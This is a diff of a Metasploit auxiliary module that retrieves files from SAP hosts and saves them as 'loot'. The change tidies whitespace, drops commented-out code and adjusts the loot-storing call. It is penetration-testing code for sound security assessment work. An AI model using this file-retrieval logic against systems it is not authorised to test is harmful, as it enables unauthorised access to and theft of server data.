@@ -28,7 +28,7 @@ class Metasploit4 < Msf::Auxiliary
 					# General
 					[ 'URL', 'http://blog.c22.cc' ]
 				],
-			'Author'       => 
+			'Author'       =>
 				[	'Chris John Riley', # original msf module
 					'Bruno Morisson <bm[at]integrity.pt>' # bulk file retrieval
 				],
@@ -55,11 +55,7 @@ class Metasploit4 < Msf::Auxiliary
 	def run_host(ip)
 		res = send_request_cgi({
 			'uri'      => "/#{datastore['URI']}",
-			'method'   => 'GET' #,
-#			'headers'  =>
-#				{
-#					'User-Agent' => datastore['UserAgent']
-#				}
+			'method'   => 'GET'
 		}, 25)
 
 		if not res
@@ -120,8 +116,6 @@ class Metasploit4 < Msf::Auxiliary
 			env = []
 			if res and res.code == 200
 				case res.body
-#				when nil
-#					# Nothing
 				when /<file>(.*)<\/file>/i
 					body = []
 					body = res.body
@@ -212,8 +206,6 @@ class Metasploit4 < Msf::Auxiliary
 
 			if res and res.code == 200
 				case res.body
-#				when nil
-#					# Nothing
 				when /<item>([^<]+)<\/item>/i
 					body = []
 					body = res.body
@@ -222,8 +214,6 @@ class Metasploit4 < Msf::Auxiliary
 				end
 
 				case res.body
-#				when nil
-					# Nothing
 				when /<name>([^<]+)<\/name>/i
 					name = $1.strip
 					success = true
@@ -245,9 +235,8 @@ class Metasploit4 < Msf::Auxiliary
 		if success
 			print_good("#{rhost}:#{rport} [SAP] #{datastore['FILETYPE'].downcase}:#{logfile.downcase} looted")
 			addr = Rex::Socket.getaddress(rhost) # Convert rhost to ip for DB
-			store_loot(
-			#	"sap.#{datastore['FILETYPE'].downcase}.file",
-				"sap.#{logfile.downcase}.file",
+			p = store_loot(
+				"sap.#{datastore['FILETYPE'].downcase}.file",
 				"text/xml",
 				addr,
 				res.body,
